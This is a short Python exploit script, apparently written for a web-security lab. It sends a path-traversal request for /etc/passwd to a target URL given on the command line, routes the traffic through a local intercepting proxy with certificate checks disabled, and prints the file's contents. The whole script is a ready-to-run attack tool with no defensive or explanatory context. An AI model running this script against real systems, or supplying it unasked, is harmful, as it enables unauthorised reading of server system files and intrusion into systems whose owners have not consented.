import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def exploit(url):

    print("(+) Checking Path Traversal...")
    res = requests.get(
        url + 'image?filename=/../../../etc/passwd', verify=False, proxies=proxies)
    print("(+) Trying to access /etc/passwd")

    if res.status_code == 200:
        print("(+) Access Granted to /etc/passwd!")
        print("\n(+) /etc/passwd file content:\n")
        print(res.text)

    else:
        print("(-) Something went wrong...try again!")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com/" % sys.argv[0])
    else:
        url = sys.argv[1]
        exploit(url)


if __name__ == "__main__":
    main()
